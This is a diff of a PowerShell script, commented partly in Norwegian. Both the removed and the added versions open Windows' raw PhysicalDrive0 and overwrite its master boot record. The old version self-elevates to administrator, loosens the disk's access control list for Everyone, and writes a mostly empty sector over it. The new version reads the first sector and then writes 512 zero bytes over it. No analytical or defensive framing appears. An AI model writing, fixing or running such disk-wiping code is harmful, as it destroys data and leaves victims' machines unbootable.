@@ -1,43 +1,53 @@
-$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")                                                                                            
-if (-not $isAdmin) {                                                                                                                                                                                                                                               
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs                                                                                                                                                         
-    Exit                                                                                                                                                                                                                                                           
-}                                                                                                                                                                                                                                                                  
-$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")                                                                                                                                                          
-$acl = Get-Acl -Path "\\.\PhysicalDrive0"                                                                                                                                                                                                                          
-$acl.SetAccessRule($rule)                                                                                                                                                                                                                                          
-Set-Acl -Path "\\.\PhysicalDrive0" -AclObject $acl                                                                                                                                                                                                                 
-$code = @"                                                                                                                                                                                                                                                        
-using System;                                                                                                                                                                                                                                                      
-using System.IO;                                                                                                                                                                                                                                                   
-using System.Runtime.InteropServices;                                                                                                                                                                                                                              
-using System.Text;                                                                                                                                                                                                                                                 
-public class Program                                                                                                                                                                                                                                               
-{                                                                                                                                                                                                                                                                  
-    public static void Main()                                                                                                                                                                                                                                      
-    {                                                                                                                                                                                                                                                              
-        string mbrFilePath = @"\\.\PhysicalDrive0";                                                                                                                                                                                                                
-        IntPtr mbrFileHandle = CreateFile(mbrFilePath, FileAccess.ReadWrite, FileShare.None, IntPtr.Zero, FileMode.Open, FileAttributes.Normal, IntPtr.Zero);                                                                                                      
-        byte[] mbrData = new byte[512];                                                                                                                                                                                                                            
-        byte[] newData = Encoding.ASCII.GetBytes("1");                                                                                                                                                                                                     
-        Array.Copy(newData, 0, mbrData, 0, newData.Length);                                                                                                                                                                                                        
-        uint bytesWritten;                                                                                                                                                                                                                                         
-        WriteFile(mbrFileHandle, mbrData, (uint)mbrData.Length, out bytesWritten, IntPtr.Zero);                                                                                                                                                                    
-        CloseHandle(mbrFileHandle);                                                                                                                                                                                                                                
-    }                                                                                                                                                                                                                                                              
-    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]                                                                                                                                                                                       
-    private static extern IntPtr CreateFile(string lpFileName, FileAccess dwDesiredAccess, FileShare dwShareMode, IntPtr lpSecurityAttributes, FileMode dwCreationDisposition, FileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile);                         
-    [DllImport("kernel32.dll", SetLastError = true)]                                                                                                                                                                                                               
-    private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);                                                                                                         
-    [DllImport("kernel32.dll", SetLastError = true)]                                                                                                                                                                                                               
-    private static extern bool CloseHandle(IntPtr hObject);                                                                                                                                                                                                        
-}                                                                                                                                                                                                                                                                  
-"@                                                                                                                                                                                                                                                                
-try {                                                                                                                                                                                                                                                              
-    Add-Type -TypeDefinition $code -Language CSharp                                                                                                                                                                                                                
-    [Program]::Main()                                                                                                                                                                                                                                              
-    Write-Host "MD"                                                                                                                                                                                                                                                
-}                                                                                                                                                                                                                                                                  
-catch {                                                                                                                                                                                                                                                            
-    Write-Host "fail"                                                                                                                                                                                                                                              
-}                                                     
+# 1. Definer Win32 CreateFile via C# P/Invoke
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+using Microsoft.Win32.SafeHandles;
+
+public class RawDisk {
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+    public static extern SafeFileHandle CreateFile(
+        string lpFileName,
+        uint dwDesiredAccess,
+        uint dwShareMode,
+        IntPtr lpSecurityAttributes,
+        uint dwCreationDisposition,
+        uint dwFlagsAndAttributes,
+        IntPtr hTemplateFile
+    );
+}
+"@
+Add-Type -TypeDefinition $code
+
+# 2. Konstanter som gyldig UInt32 (fikser feilmeldingen)
+[uint32]$GENERIC_RW = "0xC0000000"
+[uint32]$FILE_SHARE_RW = 3
+[uint32]$OPEN_EXISTING = 3
+
+$diskPath = "\\.\PhysicalDrive0"
+
+# 3. Åpne SafeFileHandle mot rå disk
+$handle = [RawDisk]::CreateFile($diskPath, $GENERIC_RW, $FILE_SHARE_RW, [IntPtr]::Zero, $OPEN_EXISTING, 0, [IntPtr]::Zero)
+
+if ($null -eq $handle -or $handle.IsInvalid) {
+    throw "Kunne ikke åpne disken. Husk å kjøre PowerShell som Administrator."
+}
+
+# 4. Koble handle til FileStream og les 1 sektor (512 bytes)
+try {
+    $fs = New-Object System.IO.FileStream($handle, [System.IO.FileAccess]::ReadWrite)
+    $buffer = New-Object byte[] 512
+    $bytesRead = $fs.Read($buffer, 0, $buffer.Length)
+    
+    ($buffer[0..15] | ForEach-Object { $_.ToString("X2") }) -join " "
+
+    # 5. Skriv nuller til MBR (første 512 bytes)
+    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
+    $zeroBuffer = New-Object byte[] 512
+    $fs.Write($zeroBuffer, 0, $zeroBuffer.Length)
+    $fs.Flush()
+}
+finally {
+    if ($fs) { $fs.Close() }
+    if ($handle) { $handle.Close() }
+}
